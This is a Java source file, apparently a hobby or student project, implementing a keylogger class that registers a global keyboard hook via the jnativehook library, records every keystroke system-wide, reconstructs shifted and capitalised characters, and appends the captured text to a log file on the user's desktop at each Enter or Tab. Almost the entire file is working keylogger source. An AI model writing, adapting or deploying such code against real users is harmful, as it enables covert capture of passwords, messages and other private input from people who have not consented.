/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ltm;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;//ghwbejhk adck
//cnjkjsdnc

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author daova
 */
public class KeyLoggerClient implements NativeKeyListener {

    public static String Text = "";
    public static String Temp;
    boolean caps = false;
    int shift = 0;

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
                if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
                    GlobalScreen.unregisterNativeHook();
                }
            }//fasd
            Temp = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();

            System.out.println(Temp);

            switch (Temp) {
                case "undefined":
                    Temp = Temp.replace("undefined", "");
                    break;
                case "alt":
                    Temp = Temp.replace("alt", "");
                    break;
                case "ctrl":
                    Temp = Temp.replace("ctrl", "");
                    break;
                case "space":

                    Temp = Temp.replace("space", " ");
                    break;
                case "caps lock":

                    Temp = Temp.replace("caps lock", "");

                    if (caps == true) {

                        caps = false;

                    } else if (caps == false) {

                        caps = true;

                    }

                    break;

                case "shift":

                    shift++;
                    Temp = Temp.replace("shift", "*^*");

                    break;

                case "left":

                    Temp = Temp.replace("left", "\u2190");

                    break;

                case "delete":

                    Temp = Temp.replace("delete", "\u21A6");

                    break;

                case "right":

                    Temp = Temp.replace("right", "\u2192");

                    break;

                case "up":

                    Temp = Temp.replace("up", "\u2191");

                    break;

                case "down":

                    Temp = Temp.replace("down", "\u2193");

                    break;

                case "backspace":

                    Temp = Temp.replace("backspace", "\u00AB");

                    break;

                case "tab":

                    Temp = Temp.replace("tab", "\u21B9");

                    break;

                case "enter":

                    Temp = Temp.replace("enter", "\n");

                    break;

                case "back quote":

                    Temp = Temp.replace("back quote", "`");

                    break;

                case "minus":

                    Temp = Temp.replace("minus", "-");

                    break;

                case "equals":

                    Temp = Temp.replace("equals", "=");

                    break;

                case "open bracket":

                    Temp = Temp.replace("open bracket", "[");

                    break;

                case "close bracket":

                    Temp = Temp.replace("close bracket", "]");

                    break;

                case "back slash":

                    Temp = Temp.replace("back slash", "\\");

                    break;

                case "semicolon":

                    Temp = Temp.replace("semicolon", ";");

                    break;

                case "quote":

                    Temp = Temp.replace("quote", "'");

                    break;

                case "comma":

                    Temp = Temp.replace("comma", ",");

                    break;

                case "period":

                    Temp = Temp.replace("period", ".");

                    break;

                case "dead acute":

                    Temp = Temp.replace("dead acute", "/");

                    break;

                case "numpad 0":

                    Temp = Temp.replace("numpad 0", "0");

                    break;

                case "numpad 1":

                    Temp = Temp.replace("numpad 1", "1");

                    break;

                case "numpad 2":

                    Temp = Temp.replace("numpad 2", "2");

                    break;

                case "numpad 3":

                    Temp = Temp.replace("numpad 3", "3");

                    break;

                case "numpad 4":

                    Temp = Temp.replace("numpad 4", "4");

                    break;

                case "numpad 5":

                    Temp = Temp.replace("numpad 5", "5");

                    break;

                case "numpad 6":

                    Temp = Temp.replace("numpad 6", "6");

                    break;

                case "numpad 7":

                    Temp = Temp.replace("numpad 7", "7");

                    break;

                case "numpad 8":

                    Temp = Temp.replace("numpad 8", "8");

                    break;

                case "numpad 9":

                    Temp = Temp.replace("numpad 9", "9");

                    break;

                case "numpad /":

                    Temp = Temp.replace("numpad /", "/");

                    break;

                case "numpad *":

                    Temp = Temp.replace("numpad *", "*");

                    break;

                case "numpad -":

                    Temp = Temp.replace("numpad -", "-");

                    break;

                case "numpad +":

                    Temp = Temp.replace("numpad +", "+");

                    break;

                case "numpad .":

                    Temp = Temp.replace("numpad .", ".");

                    break;

            }
//            if(caps == true){
//                Text = Text + Temp.toUpperCase();
//            }else{
//                Text = Text + Temp;
//            }
            Text = Text + Temp;

//------------------------------------------------------------------------------
            if (caps == true) {

                Text = Text.replace("a", "A");
                Text = Text.replace("b", "B");
                Text = Text.replace("c", "C");
                Text = Text.replace("d", "D");
                Text = Text.replace("e", "E");
                Text = Text.replace("f", "F");
                Text = Text.replace("g", "G");
                Text = Text.replace("h", "H");
                Text = Text.replace("i", "I");
                Text = Text.replace("j", "J");
                Text = Text.replace("k", "K");
                Text = Text.replace("l", "L");
                Text = Text.replace("m", "M");
                Text = Text.replace("n", "N");
                Text = Text.replace("o", "O");
                Text = Text.replace("p", "P");
                Text = Text.replace("q", "Q");
                Text = Text.replace("r", "R");
                Text = Text.replace("s", "S");
                Text = Text.replace("t", "T");
                Text = Text.replace("u", "U");
                Text = Text.replace("v", "V");
                Text = Text.replace("w", "W");
                Text = Text.replace("x", "X");
                Text = Text.replace("y", "Y");
                Text = Text.replace("z", "Z");

            }

            Text = Text.replace("*^*a", "A");
            Text = Text.replace("*^*b", "B");
            Text = Text.replace("*^*c", "C");
            Text = Text.replace("*^*d", "D");
            Text = Text.replace("*^*e", "E");
            Text = Text.replace("*^*f", "F");
            Text = Text.replace("*^*g", "G");
            Text = Text.replace("*^*h", "H");
            Text = Text.replace("*^*i", "I");
            Text = Text.replace("*^*j", "J");
            Text = Text.replace("*^*k", "K");
            Text = Text.replace("*^*l", "L");
            Text = Text.replace("*^*m", "M");
            Text = Text.replace("*^*n", "N");
            Text = Text.replace("*^*o", "O");
            Text = Text.replace("*^*p", "P");
            Text = Text.replace("*^*q", "Q");
            Text = Text.replace("*^*r", "R");
            Text = Text.replace("*^*s", "S");
            Text = Text.replace("*^*t", "T");
            Text = Text.replace("*^*u", "U");
            Text = Text.replace("*^*v", "V");
            Text = Text.replace("*^*w", "W");
            Text = Text.replace("*^*x", "X");
            Text = Text.replace("*^*y", "Y");
            Text = Text.replace("*^*z", "Z");

            Text = Text.replace("*^*`", "~");
            Text = Text.replace("*^*1", "!");
            Text = Text.replace("*^*2", "@");
            Text = Text.replace("*^*3", "#");
            Text = Text.replace("*^*4", "$");
            Text = Text.replace("*^*5", "%");
            Text = Text.replace("*^*6", "^");
            Text = Text.replace("*^*7", "&");
            Text = Text.replace("*^*8", "*");
            Text = Text.replace("*^*9", "(");
            Text = Text.replace("*^*0", ")");
            Text = Text.replace("*^*-", "_");
            Text = Text.replace("*^*=", "+");

            Text = Text.replace("*^*[", "{");
            Text = Text.replace("*^*]", "}");
            Text = Text.replace("*^*\\", "|");
            Text = Text.replace("*^*;", ":");
            Text = Text.replace("*^*'", "\"");
            Text = Text.replace("*^*,", "<");
            Text = Text.replace("*^*.", ">");
            Text = Text.replace("*^*/", "?");

            if (NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase().equals("enter")
                    || NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase().equals("tab")) {

                FileWriter fw = new FileWriter(new File("C:\\Users\\daova\\Desktop\\Log\\LogText\\KeyLogger.txt"), true);
                try (BufferedWriter bw = new BufferedWriter(fw)) {

                    bw.newLine();
                    bw.write(Text);
                    Text = "";
                }

            }

        } catch (IOException x) {
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public static void run() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }//hello viet nam
        

        GlobalScreen.getInstance().addNativeKeyListener(new KeyLoggerClient());
    }

    public static void main(String[] args) {
        run();
    }

}
